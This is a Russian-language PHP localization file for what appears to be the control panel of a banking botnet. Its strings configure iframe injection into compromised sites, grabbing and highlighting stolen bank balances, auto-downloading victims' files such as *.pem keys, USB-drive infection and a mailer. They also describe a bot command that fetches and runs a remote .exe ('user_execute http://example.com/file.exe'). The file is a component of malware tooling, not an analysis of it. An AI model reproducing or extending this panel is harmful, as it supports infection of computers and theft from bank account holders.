<?php
define('AJAX_CONFIG_SAVE',                                              'Сохранить');
define('AJAX_CONFIG_SAVE_FAILED',                                       'Ошибка при сохранении!');

define('AJAX_CONFIG_JABBER_ID',				'Jabber для уведомлений (через запятую)');
define('AJAX_CONFIG_SCAN4YOU_ID',				'ID профиля  (scan4you)');
define('AJAX_CONFIG_SCAN4YOU_TOKEN',			'API Token  (scan4you)');

define('AJAX_CONFIG_SCAN4YOU_HINT',			'Чтобы получить ID & Token, зарегистрируйтесь на сайте <a href="http://scan4you.net/" target="_blank">scan4you.net</a>, потом зайдите на страницу "Профиль"');

define('AJAX_CONFIG_IFRAMER_URL',										'URL скрипта iframer');
define('AJAX_CONFIG_IFRAMER_HTML',										'HTML код iframe');
define('AJAX_CONFIG_IFRAMER_MODE',										'Режим действия');
define('AJAX_CONFIG_IFRAMER_MODE_OFF',									'Выключен');
define('AJAX_CONFIG_IFRAMER_MODE_CHECKONLY',							'Только проверка');
define('AJAX_CONFIG_IFRAMER_MODE_INJECT',								'Инжект');
define('AJAX_CONFIG_IFRAMER_MODE_PREVIEW',								'Предпросмотр (сохраняет в существующую "iframed/")');
define('AJAX_CONFIG_IFRAMER_INJECT',									'Метод инжекта');
define('AJAX_CONFIG_IFRAMER_INJECT_SMART',								'Умный');
define('AJAX_CONFIG_IFRAMER_INJECT_APPEND',								'Дописать в конец');
define('AJAX_CONFIG_IFRAMER_INJECT_OVERWRITE',							'Перезаписать');
define('AJAX_CONFIG_IFRAMER_TRAV_DEPTH',								'Глубина обхода');
define('AJAX_CONFIG_IFRAMER_TRAV_DIR_MSK',								'Маски директорий (по одной на строке)');
define('AJAX_CONFIG_IFRAMER_TRAV_FILE_MSK',								'Маски файлов (по одной на строке)');
define('AJAX_CONFIG_IFRAMER_SET_REIFRAME_DAYS',							'Повторная обработка через N дней');
define('AJAX_CONFIG_IFRAMER_SET_REIFRAME_DAYS_HINT',					'Обрабатывать аккаунты заново каждые N дней. 0 - отключить');
define('AJAX_CONFIG_IFRAMER_SET_IFRAME_DELAY_HOURS',					'Задержка обработки, часов');
define('AJAX_CONFIG_IFRAMER_SET_IFRAME_DELAY_HOURS_HINT',				'Найденный аккаунт "отлёживается" N часов и, если он не был включён в игнор-лист — отправляется на обработку');

define('AJAX_CONFIG_NAMED_PRESETS',										'Именованные наборы');

define('AJAX_CONFIG_DBCONNECT',                                         'Citra-коннект');
define('AJAX_CONFIG_DBCONNECT_CONNECTIONS',                             'Коннекты');

define('AJAX_CONFIG_MAILER_MASTER',                                     'E-Mail мастера (для проверки): "имя ; email"');
define('AJAX_CONFIG_MAILER_SCRIPT',                                     'URL Mailer-скрипта');
define('AJAX_CONFIG_MAILER_DELAY',                                      'Задержка между отправками, секунд');
define('AJAX_CONFIG_MAILER_CHECK',                                      'Проверить');

define('AJAX_CONFIG_BALGRABBER_UPDATE_ONLY_UP',                          'Обновлять баланс только вверх');
define('AJAX_CONFIG_BALGRABBER_UPDATE_ONLY_UP_DESCR',                    'Обновлять баланс только если новое значение выше предыдущего. Снято: обновлять всегда');
define('AJAX_CONFIG_BALGRABBER_TIME_WINDOW',                             'Временное окно между (http[s], balance) отчётами, секунд');
define('AJAX_CONFIG_BALGRABBER_TIME_WINDOW_DESCR',                       'Отчёт "Balance Grabber" рассматривается только если перед ним есть отчёт типа HTTP[S] в рамках указанного временного окна');
define('AJAX_CONFIG_BALGRABBER_URLS_IGNORE',                             'URLs: игнор');
define('AJAX_CONFIG_BALGRABBER_URLS_IGNORE_HINT',                        '1 на строке. Поддерживается wildcard. Пример: <pre>*.bank.com/trash/*</pre>');
define('AJAX_CONFIG_BALGRABBER_URLS_IGNORE_DESCR',                       'Маски URL, игнорируемые при обработке сграбленных балансов');
define('AJAX_CONFIG_BALGRABBER_URLS_HIGHLIGHT',                          'Подсветка по домену');
define('AJAX_CONFIG_BALGRABBER_URLS_HIGHLIGHT_HINT',                     '1 на строке. Поддерживается wildcard. Пример: <pre>*.bank.com/*</pre>');
define('AJAX_CONFIG_BALGRABBER_URLS_HIGHLIGHT_DESCR',                    'Маски URL для подсветки. Подсвеченные балансы также приходят на Jabber для уведомлений');
define('AJAX_CONFIG_BALGRABBER_AMOUNTS_HIGHLIGHT',                       'Подсветка по балансу');
define('AJAX_CONFIG_BALGRABBER_AMOUNTS_HIGHLIGHT_HINT',                  '1 на строке: <pre>&lt;баланс&gt; &lt;валюта&gt;</pre>. Пример: <pre>5000 USD</pre>');
define('AJAX_CONFIG_BALGRABBER_AMOUNTS_HIGHLIGHT_DESCR',                 'Минимальный баланс для подсветки, по каждой валюте');
define('AJAX_CONFIG_BALGRABBER_NOTIFY_JIDS',                             'Уведомления о подсветке (JID,..)');
define('AJAX_CONFIG_BALGRABBER_RESET_DB',                                'Сбросить БД и обновить');

define('AJAX_CONFIG_FILEHUNTER_AUTODWN',                                 'Auto-download');
define('AJAX_CONFIG_FILEHUNTER_AUTODWN_DESCR',                           'Автоматически скачивать файлы, удовлетворяющие указанным маскам.');
define('AJAX_CONFIG_FILEHUNTER_AUTODWN_HINT',                            '1 на строке. Поддерживается wildcard. Пример: <pre>*.pem</pre>');
define('AJAX_CONFIG_FILEHUNTER_NOTIFY_JIDS',                             'Уведомления о загруженных файлах');
define('AJAX_CONFIG_FILEHUNTER_NOTIFY_JIDS_DESCR',                       'Отправлять Jabber-уведомления когда загружен новый файл.');
define('AJAX_CONFIG_FILEHUNTER_NOTIFY_JIDS_HINT',                        'JID, 1 на строке.');

define('AJAX_CONFIG_FLASHINFECT_USBCOUNT',                               'usbcount');
define('AJAX_CONFIG_FLASHINFECT_USBCOUNT_DESCR',                         'Порог срабатывания модуля FlashInfect: минимальное число уникальных флешек, прошедших через систему');

define('AJAX_CONFIG_BOTS_AUTORM_ENABLED',                                'Включить автоудаление?');
define('AJAX_CONFIG_BOTS_AUTORM_ENABLED_DESCR',                          'Включить автоматическое удаление ботов');
define('AJAX_CONFIG_BOTS_AUTORM_DAYS',                                   'Период в днях');
define('AJAX_CONFIG_BOTS_AUTORM_DAYS_DESCR',                             'Число дней для анализа. Боты, не проявившие активность за это время будут удалены.');
define('AJAX_CONFIG_BOTS_AUTORM_LINKS',                                  'URL masks');
define('AJAX_CONFIG_BOTS_AUTORM_LINKS_DESCR',                            'Удалять ботов, у которых не было активности по указанным маскам URL.<p>Если не задано - удаляет всех ботов, которые не были активны');
define('AJAX_CONFIG_BOTS_AUTORM_LINKS_HINT',                             'Маски URL, по 1 на строке. Например: http?://*.example.com/*');
define('AJAX_CONFIG_BOTS_AUTORM_ACTION',                                 'Действие');
define('AJAX_CONFIG_BOTS_AUTORM_ACTION_DESCR',                           'Совершаемое действие:<dl>' .
                                                                         '<dt>No action</dt><dd>Ничего не делать, только вывести список ботов (для отладки: используйте кнопку "тест")</dd>' .
                                                                         '<dt>Destroy</dt><dd>Удалить ботов (скрипт "user_destroy")</dd>' .
                                                                         '<dt>Install</dt><dd>Запустить на ботах другой *.exe файл, и удалить (скрипт "user_execute http://example.com/file.exe" && "user_destroy")</dd></dl>');
define('AJAX_CONFIG_BOTS_AUTORM_ACTION__NONE',                           'No action');
define('AJAX_CONFIG_BOTS_AUTORM_ACTION__DESTROY',                        'Destroy');
define('AJAX_CONFIG_BOTS_AUTORM_ACTION__INSTALL',                        'Install');
define('AJAX_CONFIG_BOTS_AUTORM_ACTION__INSTALL_URL',                    'Exe URL');
define('AJAX_CONFIG_BOTS_AUTORM_ACTION__INSTALL_URL_DESCR',              'Задайте URL исполняемого файла для установки');
define('AJAX_CONFIG_BOTS_AUTORM_TEST',                                   'Тест сохранённой конфигурации');
define('AJAX_CONFIG_BOTS_AUTORM_HELP',                                   'Если включён, этот инструмент будет удалять bot.exe с ботов, которые не проявляли активности в течение указанного периода в днях. . ' .
                                                                         '<p>Вы можете спокойно использовать кнопки "save" и "test" при выключенном автоудалении: оно ничего не удалит, а только отобразит список ботов к удалению');
